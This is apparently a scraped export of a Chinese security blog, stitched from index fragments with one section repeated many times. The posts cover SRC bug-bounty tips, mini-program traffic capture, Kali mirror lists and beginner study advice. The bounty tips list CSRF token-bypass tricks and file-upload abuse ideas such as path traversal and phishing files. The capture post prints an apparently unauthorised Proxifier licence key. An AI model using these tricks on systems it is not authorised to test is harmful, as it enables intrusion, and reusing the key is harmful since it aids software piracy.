文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#bypass姿势"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#威胁情报的提交"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#对于挖掘高危严重级别漏洞的一些思考"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#1自动化信息收集的能力"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#2打漏洞组合拳的能力"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#3绕waf的能力"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#4细心和耐心和一些运气"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#总结"},{"categories":["技术"],"content":" 转载自： https://xz.aliyun.com/t/8501 ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:0:0","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#"},{"categories":["技术"],"content":" 如何在mac上抓小程序的流量通过Proxifier工具代理微信小程序流量到Burp 安装Burpsuite证书到macOS系统中 安装proxifier并添加Proxifier规则 Your name or company name: macwk.com Your registration key: 2DNRX-V3PNK-TEGYN-DR01D-9UGGT brew install --cask proxifier 添加代理和配置代理规则 微信小程序路径 : /Applications/WeChat.app/Contents/MacOS/Mini Program.app ⚠️ 先启动Proxifier，再启动Burpsuite，最后打开微信小程序,(最好关掉其他代理) 抓包成功 存在其他代理(如clashX)时，Proxifier设置方法 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:1:0","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#如何在mac上抓小程序的流量"},{"categories":["系统"],"content":" 打开配置文件 vim /etc/apt/sources.list ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:1:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#打开配置文件"},{"categories":["系统"],"content":" kali源 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:2:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#kali源"},{"categories":["系统"],"content":" debian源 # 中科大源 deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free # 阿里云 deb http://mirrors.aliyun.com/debian/ buster main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib deb http://mirrors.aliyun.com/debian-security buster/updates main #deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.aliyun.com/debian-security buster/updates main # 网易源 deb http://mirrors.163.com/debian/ buster main non-free contrib deb http://mirrors.163.com/debian/ buster-updates main non-free contrib deb http://mirrors.163.com/debian/ buster-backports main non-free contrib deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib # 官方源 deb http://deb.debian.org/debian buster main contrib non-free deb http://deb.debian.org/debian buster-updates main contrib non-free deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free #deb-src http://deb.debian.org/debian buster main contrib non-free #deb-src http://deb.debian.org/debian buster-updates main contrib non-free #deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:3:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#debian源"},{"categories":["系统"],"content":" 更新软件列表并更新软件 sudo apt update \u0026\u0026 sudo apt upgrade -y ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:4:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#更新软件列表并更新软件"},{"categories":["学习"],"content":" 转载自： https://sosly.me/index.php/2017/07/17/studywebsec/ 表弟大一刚结束，学的是计算机相关的专业，上学期开始学安全相关的技术，我就给他买了一套云课堂的 《Web安全工程师微专业》 课程，结果这货学到第一课的时候，因为错过章节考试时间直接没及格……好在后边几课都按部就班的学习了，然后应该是6月份开始试着在 教育行业SRC 挖掘漏洞，到现在也只是发现了几个XSS、敏感文件泄露之类的小漏洞，和他同期学习课程的一些同学已经挖了很多了排名很靠前，还有在企业SRC挖洞的，看看别人家的表弟…之前表弟要准备课程的期末考试之类的，现在放暑假了，我就建议说可以再好好学习那套课程，趁着暑假，多实践。然后就讨论到 有没有适合入门阶段学习的Web安全书籍 这个问题。 说到Web安全书籍，这几年其实是一种百家齐放的状态，不断有优秀的书籍出版，那这里就尽可能少地整理几本我阅读过的Web安全入门书籍作为推荐。 如果没学过相关课程的小伙伴，真的从0基础开始的话，还是需要先掌握一些基本的技能： 学习 网站构建初级教程_W3C 以及 HTTP协议基础-runoob 上了解Web前后端以及HTTP协议的一些基础介绍，花半天时间对相关技术有个概念性的了解就够了。 Windows下下载 phpStudy 或者 WAMP ，在本地搭建Web服务器环境，然后自己搜索两篇文章学习下基本的操作方法。这个本地Web服务器也就相当于学习过程中的一个实验环境了。 学习浏览器的开发者工具（通常快捷键F12调出），搜索一些教学文章，掌握Chrome或者Firefox浏览器开发者工具中的Network、Elements功能的常见用法，可以查看HTTP数据包以及定位页面元素。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:0:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#"},{"categories":["学习"],"content":" 0x01 给表弟的Web安全入门建议","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:0:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#0x01-给表弟的web安全入门建议"},{"categories":["学习"],"content":" 适合初学者的Web安全书籍 《白帽子讲Web安全》 道哥出品，很多人的Web安全启蒙书。 《Web前端黑客技术揭秘》 前端黑客技术，余弦的作品。 对于读书，我觉得读书的目的是：学以致用。应该把注意力放在如何应用读到的知识，提高自己的技术，而不是学了多少内容。 一年哪怕只学习了一本书，也要让这本书的内容结结实实地提升自己的技能，而不是只为了多一点谈资或者阅读清单上多一个数目。这也是我这里只推荐了两本书的原因，因为我觉得这两本书，能够认真学习完，并且实践书中的案例和技能，已经很难得了，同时相比于简单翻一遍，要多花费很多的时间和精力。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:1:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#适合初学者的web安全书籍"},{"categories":["学习"],"content":" 工具与实战那学习Web安全呢，同时还要掌握一些工具：浏览器开发者工具与浏览器插件（如HackBar、ProxySwitcher）、抓包工具如Burpsuite、漏洞扫描和验证工具如御剑、sqlmap、AWVS，工具可以在 Freebuf上自行搜索下载，教程可以参考Web安全-i春秋系列教程中对应这几款工具的章节学习。 好的工具可以帮助我们提高测试效率，扩展测试思路。除了工具的使用，通过搭建本地实战环境练习手工技巧，也是很好的进阶之路，这里建议可以搭建 DVWA漏洞测试环境，然后参考 DVWA系列教程_Freebuf进行学习。 学习的同时也可以在在教育行业SRC等漏洞平台上挖掘漏洞，赢得认可，也是一种动力，但挖掘漏洞的时候一定要注意规范和界限，可以参考自律方能自由，《网络安全法》实施后的白帽子行为参考，挖掘漏洞的同时也要注意保护自己。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:2:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#工具与实战"},{"categories":["学习"],"content":" 适合初学者的社区和资讯站点 网站安全_i春秋社区 i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门和进阶的文章都有，可以多多交流。 Freebuf 很多科普和梳理性的文章，也经常会有时下的热点讨论。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:3:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#适合初学者的社区和资讯站点"},{"categories":["学习"],"content":" 大学在校生可以关注的一些比赛 全国大学生信息安全竞赛 这个和全国大学生电子设计竞赛信息安全技术专题邀请赛一样，都是做一个安全软硬件系统来解决一些安全问题，通常有项目文档提交、源代码提交、现场演示答辩等几个步骤，分为初赛复赛，全国大学生信息安全竞赛为每年一次，全国大学生电子设计竞赛信息安全技术专题邀请赛通常两年一次，这两个比赛获奖对于大学生都有竞赛加分，在锻炼自己的同时，对评奖学金和保研也有帮助。 全国大学生信息安全竞赛创新实践能力线上赛（CTF形式） 这个是和i春秋合作的线上赛，和线下赛目前看来还没什么关联，CTF性质的。每年的CTF比赛很多，大家可以关注i春秋等一些站点的资讯就行了，大学生组队参加CTF比赛的挺多，也是很好的锻炼方式。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:4:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#大学在校生可以关注的一些比赛"},{"categories":["学习"],"content":" 挖洞、博客与团队既然是入门了，建议就可以随着学习的深入，在一些SRC平台上挖掘漏洞，如果你不太喜欢走这个路线，也可以整理自己的学习过程，写一些技术博客进行分享，俗话说来“你挖洞来我拍砖”，都可以，而且一些平台如Freebuf、先知社区都有付费文章奖励计划，这两种都可以在学习技术的同时获取到一些物质上的奖励，如果你慢慢有了一些编程能力（Python、Web前后端等），除了让自己的安全技术自动化之外，还可以再Github等平台分享一些开源项目。相关的SRC站点我随后再说。 关于写博客，如果自己搭建站点的话，可以考虑使用hexo+github搭建免费个人博客，或者租用一台VPS部署Wordpress博客程序。其实我觉得，初学的话，可以不在站点搭建上浪费时间，在一些比较优质的博客平台上注册一个帐号即可，也可以有自己的个性域名。如oschina、博客园、简书。写博客本身就是对自己知识技能的巩固和梳理，不要怕写不好，博客就当是给自己看的。 有一个点要提示一下，既然想走安全这条路，那么给自己想一个个性的ID（昵称），提交漏洞或者注册博客时都用这个，好好维护，当做自己的个人品牌认真经营，随着你的贡献和分享越来越多，你的ID会被越来越多的人了解和认可。 积累的过程中，如果恰好遇到几个志同道合的小伙伴，那就组个小团队吧，平时技术切磋交流，或者组团挖洞，打CTF等都是极好的。也可以主动去搜寻，或者申请加入一些公开招新的安全团队。一个人有时候可以走的更快，但一个团队往往可以走的更远。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:5:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#挖洞博客与团队"},{"categories":["学习"],"content":" 一些进阶的书籍和资源推荐这部分内容按需选择即可，等你入门了之后，有了一定的技术和经验，你已经足够去规划自己的发展了。 《HTTP权威指南》 平时可以当做词典来翻阅。 《黑客攻防技术宝典 Web实战篇》 深入剖析Web安全技术。 《黑客秘笈 渗透测试实用指南》 可以在虚拟机VMware中，下载运行kali Linux的VM版本进行学习和实践。 编程技术相关的书籍和教程，W3C、菜鸟教程runoob 和现代魔法学院已经能解决很多问题了，然后语言相关的官方文档都可以当做词典来查，如果想找本书系统学习的话，这里推荐下Python、PHP和Web前端的书。 《Python核心编程》 《PHP和MySQL Web开发》 《Head First HTML与CSS》 《JavaScript高级程序设计》 站点可以浏览下 安全圈info 与 SecWiki ，前者是一个持续更新的安全圈站点导航，总能找到你想要的网站，之前说的SRC站点这里都有，后者是一个安全资讯的收录分享平台，有什么安全问题可以搜索一些历史文章看看。 